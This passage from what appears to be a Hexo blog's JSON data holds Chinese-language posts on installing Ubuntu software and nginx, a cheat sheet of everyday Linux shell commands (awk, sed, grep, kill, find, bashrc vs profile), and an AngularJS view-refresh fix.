python3-keybinder_xx.deb, kwplayer_xx.deb 这 三个软件包. 直接双击就能安装deb包.\n先安装python3-xlib, 之后是python3-keybinder, 最后是kwplayer.\n当然, 也可以在终端里安装, 比如:\n``` shell\nsudo dpkg -i kwplayer_xx.deb\nsudo apt-get -f install\n```\n\n**参考**：\nhttps://github.com/LiuLang/kwplayer\nhttps://github.com/LiuLang/kwplayer-packages\n\n\n### 8. Folder Color\n该软件已经集成到Ubuntu 15.04默认库中。\nubuntu14或ubuntu12想要安装此软件的话，需要额外添加软件库。\n\n安装命令如下：\n``` shell\nsudo add-apt-repository ppa:costales/folder-color\nsudo apt-get update\nsudo apt-get install folder-color\nnautilus -q\n```\n\n**参考**：[Folder Color 已添加到 Ubuntu 15.04 默认库中][^12]\n\n\n### ubuntu截图默认保存位置\n**参考**：[Default save directory for gnome-screenshot?][^13]\n\n\n\n[^1]: http://www.elain.org/?p=742\n[^2]: http://pkgs.org/ubuntu-14.04/getdeb-apps-amd64/chmsee_1.3.1.1-1~getdeb2_amd64.deb.html\n[^3]: http://www.longene.org/forum/viewtopic.php?t=4700\n[^4]: http://blog.csdn.net/qxb1229/article/details/8265616\n[^5]: http://blog.csdn.net/breeze5428/article/details/27353583\n[^6]: http://blog.csdn.net/tao_627/article/details/24180781\n[^7]: http://mjzhou.com/?p=158\n[^8]: http://blog.itpub.net/12216142/viewspace-708801\n[^9]: http://wiki.deepin.org/index.php?title=WinUSB\n[^10]: http://wiki.deepin.org/index.php?title=%E4%BF%A1%E4%BD%BF\n[^11]: http://imcn.me/html/y2014/19624.html\n[^12]: http://imcn.me/html/y2015/23176.html\n[^13]: http://askubuntu.com/a/134469\n","slug":"article/linux/ubuntu装机软件","published":1,"updated":"2016-03-31T15:21:32.000Z","_id":"cilpxkgah002kavbts3pv62wk","comments":1,"layout":"post","photos":[],"link":""},{"title":"linux安装nginx","date":"2015-12-29T05:58:00.000Z","_content":"\nNginx服务器的安装配置\n\n\n## 一、下载并解压安装包\n下载地址：http://nginx.org/en/download.html\n\n> tar -zxvf nginx-x.x.xx.tar.gz （x.x.xx：为版本号）\n\n\n## 二、编译\n``` shell\ncd nginx-x.x.xx\n./configure --with-http_stub_status_module --prefix=/home/yeshaoting/java/server/nginx/nginx-1.8.0 --without-http_rewrite_module --without-http_gzip_module\n```\n\n## 三、参考文档\n[Nginx服务器的安装配置](http://minitoo.blog.51cto.com/4201040/850654)","source":"_posts/article/linux/linux安装nginx.md","raw":"categories:\n  - 工具软件\ntags:\n  - nginx\n  - ubuntu\ntitle: linux安装nginx\ndate: 2015-12-29 13:58:00\n---\n\nNginx服务器的安装配置\n\n\n## 一、下载并解压安装包\n下载地址：http://nginx.org/en/download.html\n\n> tar -zxvf nginx-x.x.xx.tar.gz （x.x.xx：为版本号）\n\n\n## 二、编译\n``` shell\ncd nginx-x.x.xx\n./configure --with-http_stub_status_module --prefix=/home/yeshaoting/java/server/nginx/nginx-1.8.0 --without-http_rewrite_module --without-http_gzip_module\n```\n\n## 三、参考文档\n[Nginx服务器的安装配置](http://minitoo.blog.51cto.com/4201040/850654)","slug":"article/linux/linux安装nginx","published":1,"updated":"2016-03-31T07:36:21.000Z","_id":"cilpxkgal002qavbtycl7cnbo","comments":1,"layout":"post","photos":[],"link":""},{"title":"Ubuntu更改截图默认保存位置","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" />\n\n\n## 图形界面\n\n安装dconf-editor\n> sudo apt-get install dconf-editor\n\n打开dconf-editor，进入org -> gnome -> gnome-screenshot，修改auto-save-directory值为 file:///home/yeshaoting/Pictures/screenshot/。\n\n\n## 命令行\n> gsettings set org.gnome.gnome-screenshot auto-save-directory \"file:///home/yeshaoting/Pictures/screenshot/\"\n\n## 参考文档\n[Default save directory for gnome-screenshot?](http://askubuntu.com/a/134469)","source":"_posts/article/linux/Ubuntu更改截图默认保存位置.md","raw":"categories:\n  - 系统配置\ntags:\n  - ubuntu\ntitle: Ubuntu更改截图默认保存位置\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" />\n\n\n## 图形界面\n\n安装dconf-editor\n> sudo apt-get install dconf-editor\n\n打开dconf-editor，进入org -> gnome -> gnome-screenshot，修改auto-save-directory值为 file:///home/yeshaoting/Pictures/screenshot/。\n\n\n## 命令行\n> gsettings set org.gnome.gnome-screenshot auto-save-directory \"file:///home/yeshaoting/Pictures/screenshot/\"\n\n## 参考文档\n[Default save directory for gnome-screenshot?](http://askubuntu.com/a/134469)","slug":"article/linux/Ubuntu更改截图默认保存位置","published":1,"updated":"2016-03-31T15:21:44.000Z","_id":"cilpxkgap002wavbto2aw54dx","comments":1,"layout":"post","photos":[],"link":""},{"title":"Linux安装极点五笔的方法","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" />\n\n\n## 一、下载附件文件vissible-ibus.tar.gz\n免费下载地址在http://linux.linuxidc.com/\n用户名与密码都是www.linuxidc.com\n具体下载目录在/pub/2011/10/23/Ubuntu 11.10安装极点五笔/\n\n\n## 二、安装\n``` bash\n$ tar xvzf vissible-ibus.tar.gz\n$ cd vissible-ibus\n$ sudo cp vissible.db /usr/share/ibus-table/tables\n$ sudo cp vissible.gif /usr/share/ibus-table/icons\n```\n\n<!-- more -->\n\n## 三、删除文件\n``` bash\n$ rm vissible-ibus.tar.gz\n$ rm vissible.db\n$ rm vissible.gif\n$ rm vissible.txt\n```\n\n\n## 四、启动输入法\n在任务栏右键点那个键盘小图标，在下拉菜单选“重新重启”（这个重新启动并不是重并报启动系统，\n而是重新启动ibus输入法），然后再右键点那个键盘小图标并在下拉菜单中选“首选项”，然后在弹\n出的窗口中点击“输入法”选项卡，接着点“选择输入法”，然后添加极点五笔就可以了。\n\n\n## 五、修改右shift为中英文切换\n把table.py里的Shift_R改为Shift_L\n``` bash\n$ sudo vim table.py\n\n# Match mode switch hotkey\nif not self._editor._t_chars and ( self._match_hotkey (key, keysyms.Shift_L, modifier.SHIFT_MASK + modifier.RELEASE_MASK))\n\n……\n\nif self._match_hotkey (key, keysyms.Shift_R, modifier.SHIFT_MASK + modifier.RELEASE_MASK) and self._ime_py\n```\n\n\n## 六、参考文档\nhttp://hi.baidu.com/hkdog/item/8ae75ea5938e23de5af191ff\n","source":"_posts/article/linux/Linux安装极点五笔的方法.md","raw":"categories:\n  - 系统配置\ntags:\n  - 五笔\n  - ubuntu\ntitle: Linux安装极点五笔的方法\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" />\n\n\n## 一、下载附件文件vissible-ibus.tar.gz\n免费下载地址在http://linux.linuxidc.com/\n用户名与密码都是www.linuxidc.com\n具体下载目录在/pub/2011/10/23/Ubuntu 11.10安装极点五笔/\n\n\n## 二、安装\n``` bash\n$ tar xvzf vissible-ibus.tar.gz\n$ cd vissible-ibus\n$ sudo cp vissible.db /usr/share/ibus-table/tables\n$ sudo cp vissible.gif /usr/share/ibus-table/icons\n```\n\n<!-- more -->\n\n## 三、删除文件\n``` bash\n$ rm vissible-ibus.tar.gz\n$ rm vissible.db\n$ rm vissible.gif\n$ rm vissible.txt\n```\n\n\n## 四、启动输入法\n在任务栏右键点那个键盘小图标，在下拉菜单选“重新重启”（这个重新启动并不是重并报启动系统，\n而是重新启动ibus输入法），然后再右键点那个键盘小图标并在下拉菜单中选“首选项”，然后在弹\n出的窗口中点击“输入法”选项卡，接着点“选择输入法”，然后添加极点五笔就可以了。\n\n\n## 五、修改右shift为中英文切换\n把table.py里的Shift_R改为Shift_L\n``` bash\n$ sudo vim table.py\n\n# Match mode switch hotkey\nif not self._editor._t_chars and ( self._match_hotkey (key, keysyms.Shift_L, modifier.SHIFT_MASK + modifier.RELEASE_MASK))\n\n……\n\nif self._match_hotkey (key, keysyms.Shift_R, modifier.SHIFT_MASK + modifier.RELEASE_MASK) and self._ime_py\n```\n\n\n## 六、参考文档\nhttp://hi.baidu.com/hkdog/item/8ae75ea5938e23de5af191ff\n","slug":"article/linux/Linux安装极点五笔的方法","published":1,"updated":"2016-03-31T15:21:40.000Z","_id":"cilpxkgar002zavbtgjn9l66z","comments":1,"layout":"post","photos":[],"link":""},{"title":"Linux命令小记","date":"2016-01-15T10:02:00.000Z","_content":"\n<img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" />\n\n\n## 一、awk命令\n\n### 1. 删除重复的、非连续的行\n``` shell\n`awk '! a[$0]++'`\n```\n\n\n### 2. awk使用特殊分隔符分隔列\n``` shell\necho \"192.168.102.134\" | awk -F . '{print $4}'\n```\n\n\n## 二、sed命令\n\n### 1. 截取程序日志中某个时间范围内的文本\n``` shell\nsed -n '/^2015-05-14 15:32:30/,/^2015-05-14 16:12:09/p' access_log > log.txt\n```\n\n### 2. 去除空白行的sed\n``` shell\nSECRET=`sed '/^$/d' file.txt | head -1`\n```\n\n### 3. 通过sed替换字特殊字符\n`echo \"12,34,56\" | sed 's/,/ /g'`\n\n\n### 4. 通过sed替换二者之间的字符串内容\n文本内容：\n``` xml\n<server   id=\"film-web\"   address=\"127.0.0.1\" port=\"6881\">\n</server>\n```\n\n``` shell\nsed -n \"s/\\( *server.*port=\\\"\\).*\\(\\\".*\\)/\\1abc\\2/p\" 1.txt\nsed -n \"s/\\( *server.*address=\\\"\\).*\\(\\\" *port\\)/\\1abc\\2/p\" 1.txt\n```\n\n**注**：sed里，使用圆括号括起来的内容，可以看做是变量。使用\\1和\\2来输出。\n**参见**：http://coolshell.cn/articles/9104.html 圆括号匹配\n\n\n### 5. 从替换开始匹配行到行尾或结束匹配行区间内替换内容\n``` shell\nsed -i \"/ *server *id=/,\\${s/\\(\\<watchdog-port>\\).*\\(<\\/watchdog-port>\\)/\\18000\\2/g;}\" resin.conf\nsed \"/ *server *id=\\\"/,/<\\/server>/{s/\\(\\<watchdog-port>\\).*\\(<\\/watchdog-port>\\)/\\18888\\2/g;}\" resin.conf\n```\n\n**注**：每个匹配前后都需要加/，见上面红色部分。$表示最后一行，不需要加/\n\n\n## 三、grep命令\n\n### 1. 查找特定文件指定字符串\n`grep \"no object DCH for MIME type multipart/mixed\" *.log > MIME.log`\n\n\n### 2. 查找文本内容\n`grep -i -r --exclude=*.jar --exclude=*.log* noah .`\n\n\n### 3. 查看tomcat日志特定内容\n`tail -f catalina.out | grep timecost | grep FamilyController | awk '{if($10 > 100) print $0}'`\n\n\n### 4. 查看tomcat某天日志\n`tail -800000 catalina.out | grep 2014-06-30 > 2014-06-30.log`\n\n\n### 5. 记录统计\n``` shell\ngrep timecost file.txt | wc -l\nls | wc -l\n```\n\n### 6. grep与或非\n\n#### 与操作\n``` shell\ngrep -E 'pattern1.*pattern2' file.txt # in that order\ngrep -E 'pattern1.*pattern2|pattern2.*pattern1' file.txt # in any order\ngrep 'pattern1' file.txt | grep 'pattern2' # in any order\n```\n\n#### 或操作\n``` shell\ngrep \"pattern1\\|pattern2\" file.txt\ngrep -E \"pattern1|pattern2\" file.txt\ngrep -e pattern1 -e pattern2 file.txt\negrep \"pattern1|pattern2\" file.txt\n```\n\n#### 非操作\n``` bash\ngrep -v 'pattern1' file.txt\n```\n\n摘自：[Using BASH \"Grep OR / Grep AND / Grep NOT\" Operators](http://www.shellhacks.com/en/Using-BASH-Grep-OR-Grep-AND-Grep-NOT-Operators)\n\n\n### 7. 递归查询不包含指定内容的文件\n``` shell\ngrep -irL \"date:\" file.txt\n```\n\n\n<!-- more -->\n\n\n## 四、ps命令\n\n### 1. cpu/内存占用率排序\n``` bash\nps auxw --sort=%cpu\nps auxw --sort=%mem\n```\n\n### 2. 查看端口占用\n``` bash\nlsof -i:8080\nps -aux | grep java\nps -aux | grep pid\n```\n\n## 五、kill命令\n\n### 1. 批量关闭进程\n``` bash\nkill -9 `ps -ef | grep QQ | grep -v 'grep' | awk {'print $2'}`\n```\n\n### 2. 进程批量中止\n``` bash\nkill -9 `ps -ef | grep QQ | grep -v grep | awk {'print $2'}`\n```\n\n## 六、vim命令\n\n### 1. vim显示/隐藏行号\n``` vim\n:set nu 或 :set number\n:set nonu 或 :set nonumber\n```\n\n### 2. vim替换指定区域匹配文本\n``` vim\n: 41,57 s/10.13.92.143/10.13.92.157/g\n```\n\n## 七、date命令\n\n### 1. 打印时间\n``` bash\necho `date '+%Y-%m-%d %H:%M:%S'`\n```\n\n### 2. 时间显示\n``` bash\ndate\ndate '+%Y-%m-%d %H:%M:%S'\n```\n\n## 八、cal命令\n\n### 1. 当年当月\n`cal`\n\n### 2. 某年日历\n`cal 2015`\n\n### 3. 某年某月\n`cal 12 2015`\n\n\n## 九、ls命令\n\n### 1. linux 下查看文件个数及大小\n`ls -l |grep \"^-\"|wc -l 或 find ./company -type f | wc -l`\n\n### 2. 查看某文件夹下文件的个数，包括子文件夹里的。\n`ls -lR|grep \"^-\"|wc -l`\n\n### 3. 查看某文件夹下文件夹的个数，包括子文件夹里的。\n`ls -lR|grep \"^d\"|wc -l`\n\n### 4. 按修改先后，列出文件\n`ls -lt`\n\n\n## 十、tar命令\n\n### 1. tar打包文件，exclude选项排除指定文件或目录\n`tar zcvf ../fetch-wiki.tar.gz * --exclude=*.txt* --exclude=logs`\n\n\n## 十一、rm命令\n\n### 1. 删除 - 开头的文件\n``` shell\nrm --  -filename\nrm -- ./-filename\n```\n\n\n## 十二、echo命令\n\n### 1. echo输出制表符方式\n`echo -e \"123\\t345\"`\n\n\n### 2. shell换行\n``` bash\necho -e \"123\\n34\"\n```\n\n**注**：-e 表示特殊处理字符串里的特殊字符。\n\n\n## 十三、tail语法\n\n### 1. 查找特定字符串在文件中出现位置\n`tail -2000000 catalina.out | cat -n | grep \"2014-07-10\" | head  -2 (对于出现在文末)`\n\n\n## 十四、shell语法\n\n### 1. 批量解压zip文件\n`for z in ./*.zip; do unzip -o $z -d ./peixun-logger ; done;`\n\n### 2. 判断shell脚本输入参数个数\n`if [ $# -eq 0 ]; then`\n\n\n### 3. 逐行读取文本文件的 shell 脚本\n``` shell\nwhile read line\ndo\necho $line\ndone < $1\n```\n\n### 4. for循环\n``` shell\nfor index in {1..31}\ndo\n    ……\ndone\n```\n\n### 5. shell注释\n``` shell\n:&lt;&lt;comment\n这里是个注释哈。\ncomment\n```\n\n### 6. 获取shell脚本位置/当前脚本目录\n不能解决软链接问题：`$(cd \"$(dirname \"$0\")\"; pwd)`\n最靠谱，能处理软链接的情况以及source加载脚本的情况：`echo $( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" && pwd )`\n\n\n### 7. 查看当前bash shell版本\necho $BASH_VERSION\n\n\n### 8. 理解 bashrc 和 profile\n参见：[理解 bashrc 和 profile](https://wido.me/sunteya/understand-bashrc-and-profile)\n\n#### login shell 和 no-login shell\n“login shell” 代表用户登入, 比如使用 “su -“ 命令, 或者用 ssh 连接到某一个服务器上, 都会使用该用户默认 shell 启动 login shell 模式.\n该模式下的 shell 会去自动执行 /etc/profile 和 ~/.profile 文件, 但不会执行任何的 bashrc 文件, 所以一般再 /etc/profile 或者 ~/.profile 里我们会手动去 source bashrc 文件.\n而 no-login shell 的情况是我们在终端下直接输入 bash 或者 bash -c “CMD” 来启动的 shell.\n该模式下是不会自动去运行任何的 profile 文件.\n\n#### interactive shell 和 non-interactive shell\ninteractive shell 是交互式shell, 顾名思义就是用来和用户交互的, 提供了命令提示符可以输入命令.\n该模式下会存在一个叫 PS1 的环境变量, 如果还不是 login shell 的则会去 source /etc/bash.bashrc 和 ~/.bashrc 文件\nnon-interactive shell 则一般是通过 bash -c “CMD” 来执行的bash.\n该模式下不会执行任何的 rc 文件, 不过还存在一种特殊情况这个我之后详细讲述\n\n#### bashrc 和 profile 的区别\n看了之前那么多种状态组合, 最关键的问题是, 究竟 bashrc 和 profile 有什么区别呢?\n\n**profile**\n其实看名字就能了解大概了, profile 是某个用户唯一的用来设置环境变量的地方, 因为用户可以有多个 shell 比如 bash, sh, zsh 之类的, 但像环境变量这种其实只需要在统一的一个地方初始化就可以了, 而这就是 profile.\n\n**bashrc**\nbashrc 也是看名字就知道, 是专门用来给 bash 做初始化的比如用来初始化 bash 的设置, bash 的代码补全, bash 的别名, bash 的颜色. 以此类推也就还会有 shrc, zshrc 这样的文件存在了, 只是 bash 太常用了而已.\n\n\n### 9. 上条命令是否成功执行\n``` bash\nEXCODE=$?\nif [ \"$EXCODE\" == \"0\" ]; then\necho \"O.K\"\nelse\necho \"NOT O.K\"\nfi\n```\n\n### 10. 加载配置\n``` shell\n. slave.conf\nsource slave.conf\n```\n\n**注**：slave.conf里的值格式为K=V\n\n### 11. 执行字符串命令\n``` shell\nSLAVE_PID_COMMAND=\"ps -ef | grep $SECRET_ID | grep -v grep | awk '{print \\$2}'\"\nSLAVE_PID=$(eval $SLAVE_PID_COMMAND)\n```\n\n**注**：\n\\$要转义处理执行\n执行字符串里的命令，使用eval命令\n获取命令执行结果，可以用$()把命令包里来。\n\n\n### 12. 获取某文件路径文件名\nbasename soft_install/jenkins-job-install/archive/jdk1.7.0_60.tar.gz .tar.gz => jdk1.7.0_60\n\n\n## 十五、find命令\n\n### 1. 删除所有文件名包含Ulysses-Group的文件\n`find . -name \"*Ulysses-Group*\" -exec rm -rf {} \\;`\n\n\n## 十六、其他命令\n\n### 1. 磁盘格式转换为ntfs( 会格式化磁盘 )\n`convert X: /fs:ntfs`\n\n### 2. 命令后台处理\n`nohup command &`\n\n### 3. 重启ibus\n``` shell\nkillall ibus-daemon\nibus-daemon -drx\n```\n\n### 4. 查看用户使用的shell版本\nfinger [USERNAME]\n\n### 5. tee\n重定向到文件并打印到屏幕\n\n参见：[tee--重定向到文件并打印到屏幕](http://blog.csdn.net/love_gaohz/article/details/8100808)\n\n\n","source":"_posts/article/linux/Linux命令小记.md","raw":"categories:\n  - 工具软件\ntags:\n  - 命令\n  - 小记\n  - ubuntu\ntitle: Linux命令小记\ndate: 2016-01-15 18:02:00\n---\n\n<img src=\"/asserts/images/logo/ubuntu.png\" class=\"img-logo img-center\" />\n\n\n## 一、awk命令\n\n### 1. 删除重复的、非连续的行\n``` shell\n`awk '! a[$0]++'`\n```\n\n\n### 2. awk使用特殊分隔符分隔列\n``` shell\necho \"192.168.102.134\" | awk -F . '{print $4}'\n```\n\n\n## 二、sed命令\n\n### 1. 截取程序日志中某个时间范围内的文本\n``` shell\nsed -n '/^2015-05-14 15:32:30/,/^2015-05-14 16:12:09/p' access_log > log.txt\n```\n\n### 2. 去除空白行的sed\n``` shell\nSECRET=`sed '/^$/d' file.txt | head -1`\n```\n\n### 3. 通过sed替换字特殊字符\n`echo \"12,34,56\" | sed 's/,/ /g'`\n\n\n### 4. 通过sed替换二者之间的字符串内容\n文本内容：\n``` xml\n<server   id=\"film-web\"   address=\"127.0.0.1\" port=\"6881\">\n</server>\n```\n\n``` shell\nsed -n \"s/\\( *server.*port=\\\"\\).*\\(\\\".*\\)/\\1abc\\2/p\" 1.txt\nsed -n \"s/\\( *server.*address=\\\"\\).*\\(\\\" *port\\)/\\1abc\\2/p\" 1.txt\n```\n\n**注**：sed里，使用圆括号括起来的内容，可以看做是变量。使用\\1和\\2来输出。\n**参见**：http://coolshell.cn/articles/9104.html 圆括号匹配\n\n\n### 5. 从替换开始匹配行到行尾或结束匹配行区间内替换内容\n``` shell\nsed -i \"/ *server *id=/,\\${s/\\(\\<watchdog-port>\\).*\\(<\\/watchdog-port>\\)/\\18000\\2/g;}\" resin.conf\nsed \"/ *server *id=\\\"/,/<\\/server>/{s/\\(\\<watchdog-port>\\).*\\(<\\/watchdog-port>\\)/\\18888\\2/g;}\" resin.conf\n```\n\n**注**：每个匹配前后都需要加/，见上面红色部分。$表示最后一行，不需要加/\n\n\n## 三、grep命令\n\n### 1. 查找特定文件指定字符串\n`grep \"no object DCH for MIME type multipart/mixed\" *.log > MIME.log`\n\n\n### 2. 查找文本内容\n`grep -i -r --exclude=*.jar --exclude=*.log* noah .`\n\n\n### 3. 查看tomcat日志特定内容\n`tail -f catalina.out | grep timecost | grep FamilyController | awk '{if($10 > 100) print $0}'`\n\n\n### 4. 查看tomcat某天日志\n`tail -800000 catalina.out | grep 2014-06-30 > 2014-06-30.log`\n\n\n### 5. 记录统计\n``` shell\ngrep timecost file.txt | wc -l\nls | wc -l\n```\n\n### 6. grep与或非\n\n#### 与操作\n``` shell\ngrep -E 'pattern1.*pattern2' file.txt # in that order\ngrep -E 'pattern1.*pattern2|pattern2.*pattern1' file.txt # in any order\ngrep 'pattern1' file.txt | grep 'pattern2' # in any order\n```\n\n#### 或操作\n``` shell\ngrep \"pattern1\\|pattern2\" file.txt\ngrep -E \"pattern1|pattern2\" file.txt\ngrep -e pattern1 -e pattern2 file.txt\negrep \"pattern1|pattern2\" file.txt\n```\n\n#### 非操作\n``` bash\ngrep -v 'pattern1' file.txt\n```\n\n摘自：[Using BASH \"Grep OR / Grep AND / Grep NOT\" Operators](http://www.shellhacks.com/en/Using-BASH-Grep-OR-Grep-AND-Grep-NOT-Operators)\n\n\n### 7. 递归查询不包含指定内容的文件\n``` shell\ngrep -irL \"date:\" file.txt\n```\n\n\n<!-- more -->\n\n\n## 四、ps命令\n\n### 1. cpu/内存占用率排序\n``` bash\nps auxw --sort=%cpu\nps auxw --sort=%mem\n```\n\n### 2. 查看端口占用\n``` bash\nlsof -i:8080\nps -aux | grep java\nps -aux | grep pid\n```\n\n## 五、kill命令\n\n### 1. 批量关闭进程\n``` bash\nkill -9 `ps -ef | grep QQ | grep -v 'grep' | awk {'print $2'}`\n```\n\n### 2. 进程批量中止\n``` bash\nkill -9 `ps -ef | grep QQ | grep -v grep | awk {'print $2'}`\n```\n\n## 六、vim命令\n\n### 1. vim显示/隐藏行号\n``` vim\n:set nu 或 :set number\n:set nonu 或 :set nonumber\n```\n\n### 2. vim替换指定区域匹配文本\n``` vim\n: 41,57 s/10.13.92.143/10.13.92.157/g\n```\n\n## 七、date命令\n\n### 1. 打印时间\n``` bash\necho `date '+%Y-%m-%d %H:%M:%S'`\n```\n\n### 2. 时间显示\n``` bash\ndate\ndate '+%Y-%m-%d %H:%M:%S'\n```\n\n## 八、cal命令\n\n### 1. 当年当月\n`cal`\n\n### 2. 某年日历\n`cal 2015`\n\n### 3. 某年某月\n`cal 12 2015`\n\n\n## 九、ls命令\n\n### 1. linux 下查看文件个数及大小\n`ls -l |grep \"^-\"|wc -l 或 find ./company -type f | wc -l`\n\n### 2. 查看某文件夹下文件的个数，包括子文件夹里的。\n`ls -lR|grep \"^-\"|wc -l`\n\n### 3. 查看某文件夹下文件夹的个数，包括子文件夹里的。\n`ls -lR|grep \"^d\"|wc -l`\n\n### 4. 按修改先后，列出文件\n`ls -lt`\n\n\n## 十、tar命令\n\n### 1. tar打包文件，exclude选项排除指定文件或目录\n`tar zcvf ../fetch-wiki.tar.gz * --exclude=*.txt* --exclude=logs`\n\n\n## 十一、rm命令\n\n### 1. 删除 - 开头的文件\n``` shell\nrm --  -filename\nrm -- ./-filename\n```\n\n\n## 十二、echo命令\n\n### 1. echo输出制表符方式\n`echo -e \"123\\t345\"`\n\n\n### 2. shell换行\n``` bash\necho -e \"123\\n34\"\n```\n\n**注**：-e 表示特殊处理字符串里的特殊字符。\n\n\n## 十三、tail语法\n\n### 1. 查找特定字符串在文件中出现位置\n`tail -2000000 catalina.out | cat -n | grep \"2014-07-10\" | head  -2 (对于出现在文末)`\n\n\n## 十四、shell语法\n\n### 1. 批量解压zip文件\n`for z in ./*.zip; do unzip -o $z -d ./peixun-logger ; done;`\n\n### 2. 判断shell脚本输入参数个数\n`if [ $# -eq 0 ]; then`\n\n\n### 3. 逐行读取文本文件的 shell 脚本\n``` shell\nwhile read line\ndo\necho $line\ndone < $1\n```\n\n### 4. for循环\n``` shell\nfor index in {1..31}\ndo\n    ……\ndone\n```\n\n### 5. shell注释\n``` shell\n:&lt;&lt;comment\n这里是个注释哈。\ncomment\n```\n\n### 6. 获取shell脚本位置/当前脚本目录\n不能解决软链接问题：`$(cd \"$(dirname \"$0\")\"; pwd)`\n最靠谱，能处理软链接的情况以及source加载脚本的情况：`echo $( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" && pwd )`\n\n\n### 7. 查看当前bash shell版本\necho $BASH_VERSION\n\n\n### 8. 理解 bashrc 和 profile\n参见：[理解 bashrc 和 profile](https://wido.me/sunteya/understand-bashrc-and-profile)\n\n#### login shell 和 no-login shell\n“login shell” 代表用户登入, 比如使用 “su -“ 命令, 或者用 ssh 连接到某一个服务器上, 都会使用该用户默认 shell 启动 login shell 模式.\n该模式下的 shell 会去自动执行 /etc/profile 和 ~/.profile 文件, 但不会执行任何的 bashrc 文件, 所以一般再 /etc/profile 或者 ~/.profile 里我们会手动去 source bashrc 文件.\n而 no-login shell 的情况是我们在终端下直接输入 bash 或者 bash -c “CMD” 来启动的 shell.\n该模式下是不会自动去运行任何的 profile 文件.\n\n#### interactive shell 和 non-interactive shell\ninteractive shell 是交互式shell, 顾名思义就是用来和用户交互的, 提供了命令提示符可以输入命令.\n该模式下会存在一个叫 PS1 的环境变量, 如果还不是 login shell 的则会去 source /etc/bash.bashrc 和 ~/.bashrc 文件\nnon-interactive shell 则一般是通过 bash -c “CMD” 来执行的bash.\n该模式下不会执行任何的 rc 文件, 不过还存在一种特殊情况这个我之后详细讲述\n\n#### bashrc 和 profile 的区别\n看了之前那么多种状态组合, 最关键的问题是, 究竟 bashrc 和 profile 有什么区别呢?\n\n**profile**\n其实看名字就能了解大概了, profile 是某个用户唯一的用来设置环境变量的地方, 因为用户可以有多个 shell 比如 bash, sh, zsh 之类的, 但像环境变量这种其实只需要在统一的一个地方初始化就可以了, 而这就是 profile.\n\n**bashrc**\nbashrc 也是看名字就知道, 是专门用来给 bash 做初始化的比如用来初始化 bash 的设置, bash 的代码补全, bash 的别名, bash 的颜色. 以此类推也就还会有 shrc, zshrc 这样的文件存在了, 只是 bash 太常用了而已.\n\n\n### 9. 上条命令是否成功执行\n``` bash\nEXCODE=$?\nif [ \"$EXCODE\" == \"0\" ]; then\necho \"O.K\"\nelse\necho \"NOT O.K\"\nfi\n```\n\n### 10. 加载配置\n``` shell\n. slave.conf\nsource slave.conf\n```\n\n**注**：slave.conf里的值格式为K=V\n\n### 11. 执行字符串命令\n``` shell\nSLAVE_PID_COMMAND=\"ps -ef | grep $SECRET_ID | grep -v grep | awk '{print \\$2}'\"\nSLAVE_PID=$(eval $SLAVE_PID_COMMAND)\n```\n\n**注**：\n\\$要转义处理执行\n执行字符串里的命令，使用eval命令\n获取命令执行结果，可以用$()把命令包里来。\n\n\n### 12. 获取某文件路径文件名\nbasename soft_install/jenkins-job-install/archive/jdk1.7.0_60.tar.gz .tar.gz => jdk1.7.0_60\n\n\n## 十五、find命令\n\n### 1. 删除所有文件名包含Ulysses-Group的文件\n`find . -name \"*Ulysses-Group*\" -exec rm -rf {} \\;`\n\n\n## 十六、其他命令\n\n### 1. 磁盘格式转换为ntfs( 会格式化磁盘 )\n`convert X: /fs:ntfs`\n\n### 2. 命令后台处理\n`nohup command &`\n\n### 3. 重启ibus\n``` shell\nkillall ibus-daemon\nibus-daemon -drx\n```\n\n### 4. 查看用户使用的shell版本\nfinger [USERNAME]\n\n### 5. tee\n重定向到文件并打印到屏幕\n\n参见：[tee--重定向到文件并打印到屏幕](http://blog.csdn.net/love_gaohz/article/details/8100808)\n\n\n","slug":"article/linux/Linux命令小记","published":1,"updated":"2016-03-31T15:21:38.000Z","_id":"cilpxkgat0032avbt2ly11s5r","comments":1,"layout":"post","photos":[],"link":""},{"title":"angularjs视图跳转不刷新问题","date":"2016-03-09T07:56:00.000Z","_content":"\n<img src=\"/asserts/images/logo/angularjs.png\" class=\"img-logo img-center\" />\n\n\n在实际工作过程中，发现通过 `$state.go(\"stage2\")` 让视图跳转到stage2，但视图内容并不刷新。\n\n## 一、问题解决\n\n### 1. 方法一\n通过修改地址栏内容，模板一次用户通过地址栏输入地址操作。\n\n``` javascript\n//be sure to inject $scope and $location\nvar changeLocation = function(url, forceReload) {\n  $scope = $scope || angular.element(document).scope();\n  if(forceReload || $scope.$$phase) {\n    window.location = url;\n  }\n  else {\n    //only use this if you want to replace the history stack\n    //$location.path(url).replace();\n\n    //this this if you want to change the URL and add it to the history stack\n    $location.path(url);\n    $scope.$apply();\n  }\n};\n```\n\n### 2. 方法二\n通过自带的参数reload，要求视图跳转时强制刷新视图内容。\n``` javascript\n$state.go(\"stage2\", {}, {\"reload\": true});\n```\n\n或者视图跳转完后，通过reloa()方法刷新视图。\n``` javascript\n$state.go(\"stage2\");\n$state.reload(\"stage2\");\n```\n\n\n## 二、参考文档\n- [In Angular, how to redirect with $location.path as $http.post success callback](http://stackoverflow.com/a/14387747)\n- [$state](http://angular-ui.github.io/ui-router/site/#/api/ui.router.state.$state)","source":"_posts/article/js/angularjs视图跳转不刷新问题.md","raw":"title: angularjs视图跳转不刷新问题\ntags:\n  - angularjs\ncategories:\n  - 前端设计\ndate: 2016-03-09 15:56:00\n---\n\n<img src=\"/asserts/images/logo/angularjs.png\" class=\"img-logo img-center\" />\n\n\n在实际工作过程中，发现通过 `$state.go(\"stage2\")` 让视图跳转到stage2，但视图内容并不刷新。\n\n## 一、问题解决\n\n### 1. 方法一\n通过修改地址栏内容，模板一次用户通过地址栏输入地址操作。\n\n``` javascript\n//be sure to inject $scope and $location\nvar changeLocation = function(url, forceReload) {\n  $scope = $scope || angular.element(document).scope();\n  if(forceReload || $scope.$$phase) {\n    window.location = url;\n  }\n  else {\n    //only use this if you want to replace the history stack\n    